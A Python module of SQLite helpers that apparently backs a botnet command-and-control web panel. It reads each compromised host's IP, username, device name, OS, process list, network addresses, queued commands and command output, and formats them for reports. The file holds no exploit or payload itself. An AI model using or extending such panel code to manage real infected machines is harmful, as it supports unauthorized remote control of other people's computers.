import json
import sqlite3 as sql
from datetime import datetime


def get_bot_info(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute('''SELECT * FROM bots WHERE uuid=?''', (id,))
    return cur.fetchone()


def bot_tostringlist(conn:sql.Connection, id):
    """
    Used in bot.html to generate bot report
    :param conn: sqlite connection
    :param id: bot ID
    :return: list of strings to print
    """
    cur = conn.cursor()
    cur.execute('''SELECT uuid, checkin, ip, username, devicename, region, memory, commandqueue, os FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    lst = []
    lst.append("UUID: {}".format(data[0]))
    lst.append("Last Checkin: {} UTC".format((datetime.utcfromtimestamp(data[1]).strftime('%Y-%m-%d %H:%M:%S'))))
    lst.append("IP: {}".format(data[2]))
    lst.append("OS: {}".format(data[8]))
    lst.append("Username: {}".format(data[3]))
    lst.append("Device Name: {}".format(data[4]))
    lst.append("Region: {}".format(data[5]))
    lst.append("Memory Amount: {}".format(data[6]))
    lst.append("Command queue: {}".format(data[7]))
    return lst


def bot_nwaddrtostring(conn:sql.Connection, id):
    """
    Used in botnetworkaddresslist.html to generate network addr report
    :param conn: sqlite connection
    :param id: bot id
    :return: list of network addresses (MAC/IP) of the indicated bot
    """
    cur = conn.cursor()
    cur.execute('''SELECT networkaddresses FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    if data:
        json_data = json.loads(data[0])
        return json_data
    else:
        return "No network address data"


def bot_pstostring(conn:sql.Connection, id):
    """
    Used in botproclist.html to generate process list report
    :param conn: sqlite connection
    :param id: bot id
    :return: list of processes and PIDs of the indicated bot
    """
    cur = conn.cursor()
    cur.execute('''SELECT processlist FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    print(data)
    if data[0]:
        json_data = json.loads(data[0])
        return json_data
    else:
        return "No process data"


def bot_cmdouttostring(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute('''SELECT commandout FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    if data:
        return data[0].split("\n")
    else:
        return "No command output available"




def get_bot_commandqueue(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute("SELECT commandqueue FROM bots WHERE uuid=?", (id,))
    return cur.fetchone()


def get_bot_commandout(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute("SELECT commandout FROM bots WHERE uuid=?", (id,))
    return cur.fetchone()

def get_all_bot_ids(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT uuid FROM bots ORDER BY checkin DESC')
    return_val = cur.fetchall()
    return return_val

def get_all_bot_ids_and_networking(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT uuid, networkaddresses FROM bots ORDER BY checkin DESC')
    return_val = cur.fetchall()
    return return_val

def get_bot_count(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT COUNT(uuid) FROM bots')
    return_val = cur.fetchone()[0]
    return return_val

def get_user_count(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT COUNT(username) FROM userdata')
    return_val = cur.fetchone()[0]
    return return_val